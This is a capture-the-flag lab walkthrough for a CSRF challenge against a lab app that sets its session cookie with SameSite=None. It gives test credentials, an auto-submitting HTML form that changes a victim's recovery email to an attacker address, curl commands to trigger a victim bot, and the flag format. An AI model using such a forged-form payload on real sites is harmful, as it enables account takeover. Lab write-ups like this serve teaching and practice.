# CSRF — SameSiteNone · Snackco (difficulty: low)

`POST /account/recovery-email` changes the logged-in user's recovery email and has **no CSRF token** — Snackco relies entirely on the session cookie's SameSite attribute (SEC-02). The flaw is in the login route: it sets the session cookie with **`SameSite=None`**, which tells the browser to attach it to cross-site requests — including cross-site POSTs. With the base default (`SameSite=Lax`) the cookie would already be withheld from cross-site form posts; `None` reopens the door (in real modern browsers `None` additionally requires `Secure`, which plain-HTTP origins cannot satisfy — the lab documents the attribute semantics with that caveat; the victim bot models the cookie-attachment difference conceptually).

Intended path:
1. Log in at http://victim.target.lab:8119/ as `0xnhsec` / `vlh-tester-01` and inspect the `Set-Cookie` header from `POST /login` (curl -v): `sid=…; Path=/; SameSite=None`.
2. Open http://victim.target.lab:8119/account — the change form has no token, only the cookie stands between a victim and a forged submit.
3. Store the artifact on the exploit server: `<form action="http://victim.target.lab:8119/account/recovery-email" method="POST"><input name="recovery_email" value="attacker@evil.example"></form><script>document.forms[0].submit()</script>`
4. Trigger the victim bot: `curl -X POST http://collector.target.lab:8119/victim -H 'Content-Type: application/json' -d '{"url":"http://victim.target.lab:8119/account/recovery-email","method":"POST","body":{"recovery_email":"attacker@evil.example"}}'`
5. `curl http://collector.target.lab:8119/verify` → flag (innocent's `recovery_email` row changed).

Flag: `DSLTV{CSRF-SameSiteNone-<9-10 digits>}` (event-verified — minted by the verifier, regenerated every restart).
